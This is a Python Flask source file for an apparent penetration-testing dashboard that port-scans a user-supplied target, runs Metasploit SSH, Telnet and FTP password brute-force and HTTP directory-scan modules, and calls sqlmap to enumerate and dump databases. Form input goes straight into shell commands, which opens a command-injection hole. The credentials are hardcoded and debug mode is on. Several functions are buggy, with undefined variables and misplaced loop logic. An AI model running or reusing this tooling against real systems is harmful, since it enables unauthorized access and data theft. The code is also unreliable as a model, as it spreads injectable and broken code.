from flask import Flask, render_template, request, jsonify, send_from_directory,send_file, url_for, session
from pymetasploit3.msfrpc import MsfRpcClient
import socket
import os
import requests
import csv
import subprocess

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'
client = MsfRpcClient('msf', server='127.0.0.1', port=55552)
METASPLOIT_HOST = '127.0.0.1'
METASPLOIT_PORT = 55552
METASPLOIT_PASSWORD = 'msf'
def create_msf_client():
    try:
        msf_client = MsfRpcClient(METASPLOIT_PASSWORD, server=METASPLOIT_HOST, port=METASPLOIT_PORT)
        return msf_client
    except Exception as e:
        print(f"Failed to connect to Metasploit RPC server: {e}")
        return None

def scan_port(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Adjust the timeout as needed
        result = sock.connect_ex((target_ip, port))
        sock.close()
        if result == 0:
            return True
        else:
            return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def get_service_name(port, protocolname):
    try:
        service_name = socket.getservbyport(port, protocolname)
        return service_name
    except Exception as e:
        return f"Unknown Service ({e})"

def check_services_availability(target_ip):
    ssh_port = 22
    telnet_port = 23
    http_port = 80
    
    ssh_available = scan_port(target_ip, ssh_port)
    telnet_available = scan_port(target_ip, telnet_port)
    http_available = scan_port(target_ip, http_port)
    
    return ssh_available, telnet_available, http_available

@app.route('/', methods=['GET', 'POST'])
def index():
    open_ports = []
    target_ip = ""
    if request.method == 'POST':
        target_ip = request.form.get('target_ip')
        for port in range(1, 65536):
            if scan_port(target_ip, port):
                service_name = get_service_name(port, 'tcp')
                open_ports.append({'port': port, 'service': service_name})
    return render_template('index.html', target_ip=target_ip, open_ports=open_ports)

@app.route('/open_ports', methods=['POST'])
def open_ports():
    target_ip = request.form.get('target_ip')
    session['target_ip'] = target_ip
    open_ports = []
    for port in range(1, 65536):
        if scan_port(target_ip, port):
            service_name = get_service_name(port, 'tcp')
            open_ports.append({'port': port, 'service': service_name})
    return render_template('open_ports.html', target_ip=target_ip, open_ports=open_ports)

   
@app.route('/brute_force', methods=['GET','POST'])
def brute_force():
    return render_template('brute_force.html')

    
def create_msf_client():
    try:
        msf_client = MsfRpcClient(METASPLOIT_PASSWORD, server=METASPLOIT_HOST, port=METASPLOIT_PORT)
        return msf_client
    except Exception as e:
        print(f"Failed to connect to Metasploit RPC server: {e}")
        return None

msf_client = create_msf_client()
@app.route('/ssh_brute_force', methods=['POST'])
def ssh_brute_force():
    try:
        ssh_username_file = request.files['ssh_username_file']
        ssh_passwords_file = request.files['ssh_passwords_file']
        username_file_path = os.path.join('/home/kali', ssh_username_file.filename)
        password_file_path = os.path.join('/home/kali', ssh_passwords_file.filename)
        ssh_username_file.save(username_file_path)
        ssh_passwords_file.save(password_file_path)
        ssh_username_data = ssh_username_file.read().decode('utf-8')
        ssh_passwords_data = ssh_passwords_file.read().decode('utf-8')
        target_ip = session.get('target_ip', '')

        # Metasploit SSH brute force module (example command)
        module_name = 'scanner/ssh/ssh_login'
        module_options = {
            'RHOSTS': target_ip,
            'USER_FILE': username_file_path,
            'PASS_FILE': password_file_path,
            'STOP_ON_SUCCESS' : True,
            'RPORT' : 22
            
        }

        # Run Metasploit module
        exploit = msf_client.modules.use('auxiliary',module_name)
        #msf_client.modules.set_module_options(module_name, module_options)
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 22
        exploit['USER_FILE'] = username_file_path
        exploit['PASS_FILE'] = password_file_path
        exploit['STOP_ON_SUCCESS'] = False
        
        exploit.execute(payload='scanner/ssh/ssh_login')
        console_id = msf_client.consoles.console().cid
        console = msf_client.consoles.console(console_id)
        console.run_module_with_output(exploit, payload='scanner/ssh/ssh_login')
        exploit_output = console.run_module_with_output(exploit, payload='scanner/ssh/ssh_login')
        exploit_output_lines = exploit_output.split('\n')
        msf_client.sessions.list
        successful_logins = []


        for line in exploit_output_lines:
            if 'Success' in line:
                parts = line.split("'")
                username, password = parts[1].split(":")
        
        # Additional logic to filter successful attempts based on specific conditions
        if 'Could not chdir to home directory' not in line:
            successful_logins.append({
                'username': username,
                'password': password,
            })

        return render_template('ssh_brute_force.html', successful_logins=successful_logins)
    except Exception as e:
        return str(e)
        

@app.route('/telnet_brute_force', methods=['POST'])
def telnet_brute_force():
    try:
        telnet_username_file = request.files['telnet_username_file']
        telnet_passwords_file = request.files['telnet_passwords_file']
        user_file_path = os.path.join('/home/kali', telnet_username_file.filename)
        pass_file_path = os.path.join('/home/kali', telnet_passwords_file.filename)
        telnet_username_file.save(user_file_path)
        telnet_passwords_file.save(pass_file_path)
        telnet_user_data = telnet_username_file.read().decode('utf-8')
        telnet_passwords_data = telnet_passwords_file.read().decode('utf-8')
        target_ip = session.get('target_ip', '')
        

        # Metasploit Telnet brute force module (example command)
        module_name = 'scanner/telnet/telnet_login'
        module_options = {
            'RHOSTS': target_ip,
            'USER_FILE': user_file_path,
            'PASS_FILE': pass_file_path,
            'RPORT': 23,
            'STOP_ON_SUCCESS': False  # Set STOP_ON_SUCCESS to true
        }

        # Run Metasploit module
        exploit = msf_client.modules.use('auxiliary', module_name)
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 23
        exploit['USER_FILE'] = user_file_path
        exploit['PASS_FILE'] = pass_file_path
        exploit['STOP_ON_SUCCESS'] = False
        exploit.execute(payload='scanner/telnet/telnet_login')
        console_id = msf_client.consoles.console().cid
        console = msf_client.consoles.console(console_id)
        console.run_module_with_output(exploit, payload='scanner/telnet/telnet_login')
        exploit_output = console.run_module_with_output(exploit, payload='scanner/telnet/telnet_login')
        # Process the exploit result and format it
        exploit_output_li = exploit_output.split('\n')
        print(exploit_output_li)
        msf_client.sessions.list # Remove empty lines

        return render_template('telnet_brute_force.html', exploit_output_li=exploit_output_li)# Pass the formatted result data to the template
        

    except Exception as e:
        return str(e)   
        
@app.route('/http_brute_force', methods=['POST'])
def http_brute_force():
    try:
        # Metasploit HTTP directory scanner module
        module_name = 'scanner/http/dir_scanner'
        target_ip = session.get('target_ip', '')
        module_options = {
            'RHOSTS': target_ip,  # Set your target IP address manually
            'RPORT': 80,  # Update with the target port
            'THREADS': 10,
            'SSL': False  # Set to True if the target uses HTTPS
        }

        # Run Metasploit module
        exploit = msf_client.modules.use('auxiliary', module_name)
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 80
        exploit['THREADS'] = 10
        exploit['SSL'] = False
        

        exploit.execute(payload='scanner/http/dir_scanner')
        console_id = msf_client.consoles.console().cid
        console = msf_client.consoles.console(console_id)
        console.run_module_with_output(exploit, payload='scanner/http/dir_scanner')
        exploit_output = console.run_module_with_output(exploit, payload='scanner/http/dir_scanner')
        exploit_output_lines = exploit_output.split('\n')

        return render_template('http_brute_force.html', exploit_output_lines=exploit_output_lines)

    except Exception as e:
        return str(e)
        


@app.route('/ftp_brute_force', methods=['POST','GET'])
def ftp_brute_force():
    try:
        ftp_username_file = request.files['ftp_username_file']
        ftp_passwords_file = request.files['ftp_passwords_file']
        user_file_path = os.path.join('/home/kali', ftp_username_file.filename)
        pass_file_path = os.path.join('/home/kali', ftp_passwords_file.filename)
        ftp_username_file.save(user_file_path)
        ftp_passwords_file.save(pass_file_path)
        ftp_user_data = ftp_username_file.read().decode('utf-8')
        ftp_passwords_data = ftp_passwords_file.read().decode('utf-8')
        target_ip = session.get('target_ip', '')
        
        

        # Metasploit Telnet brute force module (example command)
        module_name = 'scanner/ftp/ftp_login'
        module_options = {
            'RHOSTS': target_ip,
            'USER_FILE': user_file_path,
            'PASS_FILE': pass_file_path,
            'RPORT': 21,
            'STOP_ON_SUCCESS': False  # Set STOP_ON_SUCCESS to true
        }

        # Run Metasploit module
        exploit = msf_client.modules.use('auxiliary', module_name)
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 21
        exploit['USER_FILE'] = user_file_path
        exploit['PASS_FILE'] = pass_file_path
        exploit['STOP_ON_SUCCESS'] = False
        exploit.execute(payload='scanner/ftp/ftp_login')
        console_id = msf_client.consoles.console().cid
        console = msf_client.consoles.console(console_id)
        console.run_module_with_output(exploit, payload='scanner/ftp/ftp_login')
        exploit_output = console.run_module_with_output(exploit, payload='scanner/ftp/ftp_login')
        # Process the exploit result and format it
        exploit_output_li = exploit_output.split('\n')
        print(exploit_output_li)

# Check if sessions list is available and is not a boolean
        
        
 # Remove empty lines

        return render_template('ftp_brute_force.html', exploit_output_li=exploit_output_li)# Pass the formatted result data to the template
        

    except Exception as e:
        print(f"An error occurred: {e}")
        print(f"Type of exception: {type(e)}")
        print(f" :{exploit_output_li}" )
        return str(e)

@app.route('/sql_injection_result', methods=['GET', 'POST'])
def sql_injection():
    if request.method == 'POST':
        target_url = request.form.get('target_url')
        get_id = request.form.get('get_id')

        # Construct the SQLMap command
        sqlmap_command = f"sqlmap -u {target_url} --data={get_id} --batch --random-agent"

        # Execute SQLMap using subprocess
        try:
            result = subprocess.check_output(sqlmap_command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            result = e.output

        return render_template('sql_injection_result.html', result=result)

    return render_template('sql_injection_result.html')


@app.route('/sql_injection_database', methods=['GET', 'POST'])
def sql_injection_database():
    if request.method == 'POST':
        target_url = request.form.get('target_url')
        get_id = request.form.get('get_id')

        # Construct the SQLMap command
        sqlmap_command = f"sqlmap -u {target_url} --data={get_id} --dbs --batch --random-agent"

        # Execute SQLMap using subprocess
        try:
            result = subprocess.check_output(sqlmap_command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            result = e.output

        return render_template('sql_injection_database.html', result=result)

    return render_template('sql_injection_database.html')


 
@app.route('/sql_injection_tables', methods=['GET', 'POST'])
def sql_injection_tables():
    if request.method == 'POST':
        target_url = request.form.get('target_url')
        get_id = request.form.get('get_id')
        selected_database = request.form.get('selected_database')  # Add a new form field for the selected database

        # Construct the SQLMap command to reveal available databases
        dbs_sqlmap_command = f"sqlmap -u {target_url} --data={get_id} -D {selected_database} --tables --batch --random-agent"

        try:
            result = subprocess.check_output(dbs_sqlmap_command, shell=True, stderr=subprocess.STDOUT, text=True)
            print(result) # Print the result to the console for inspection
        except subprocess.CalledProcessError as e:
            result = e.output
            print(result)  # Print the error output to the console for inspection

        return render_template('sql_injection_tables.html', result=result, selected_database=selected_database)

    return render_template('sql_injection_tables.html')
@app.route('/sql_injection_columns', methods=['GET', 'POST'])
def sql_injection_columns():
    if request.method == 'POST':
        target_url = request.form.get('target_url')
        get_id = request.form.get('get_id')
        selected_database = request.form.get('selected_database')
        selected_t = request.form.get('selected_t') 
        print(f"Received selected_t: {selected_t}")
        
          # Add a new form field for the selected database

        # Construct the SQLMap command to reveal available databases
        dbs_sqlmap_command = f"sqlmap -u {target_url} --data={get_id} -D {selected_database} -T {selected_t} --columns  --batch --random-agent"
        
        try:
            result = subprocess.check_output(dbs_sqlmap_command, shell=True, stderr=subprocess.STDOUT, text=True)
            print(result)  # Print the result to the console for inspection
        except subprocess.CalledProcessError as e:
            result = e.output
            print(result)  # Print the error output to the console for inspection
            
          
            
        print(f"SQLMap Command: {dbs_sqlmap_command}")
   
        
        return render_template('sql_injection_columns.html', result=result,selected_database=selected_database,selected_t=selected_t)

    return render_template('sql_injection_columns.html')


@app.route('/extract_columns', methods=['POST'])
def extract_columns():
    app.logger.info("Extract Columns route called.")
    selected_database = request.form.get('selected_database')
    selected_t = request.form.get('selected_t')
    target_url = request.form.get('target_url')
    get_id = request.form.get('get_id')
    output_directory = f'/root/.local/share/sqlmap/output/192.168.10.12/dump/'

    sqlmap_command = f"sqlmap -u {target_url} --data={get_id} -D {selected_database} -T {selected_t} --dump --batch"

    try:
        result = subprocess.run(sqlmap_command, shell=True, check=True, capture_output=True, text=True)

        if result.returncode == 0:
            csv_file_path = os.path.join(output_directory, f'{selected_database}/{selected_t}.csv')

            # Read the CSV file
            with open(csv_file_path, 'r') as csv_file:
                csv_reader = csv.DictReader(csv_file)
                # Convert the CSV data to a list of dictionaries
                csv_data = list(csv_reader)

            # Pass the CSV data to the template
            return render_template('extract_columns.html', csv_data=csv_data)
        else:
            return render_template('error.html', error=result.stderr)
    except subprocess.CalledProcessError as e:
        return render_template('error.html', error=str(e))
    except Exception as e:
        return render_template('error.html', error=str(e))
@app.route('/sql_injection', methods=['GET', 'POST'])
def test():   
    return render_template('sql_injection.html')
@app.route('/csvtest', methods=['GET', 'POST'])
def testt():   
    return render_template('csvtest.html') 
@app.route('/myfile.csv')
def get_csv():
    # Replace 'path/to/your/book.csv' with the actual path to your CSV file
    return send_file(f' /root/.local/share/sqlmap/output/{target_url}/dump/{selected_database}/{selected_table}.csv', as_attachment=True)    
if __name__ == '__main__':
    app.run(debug=True)
        
    

                         

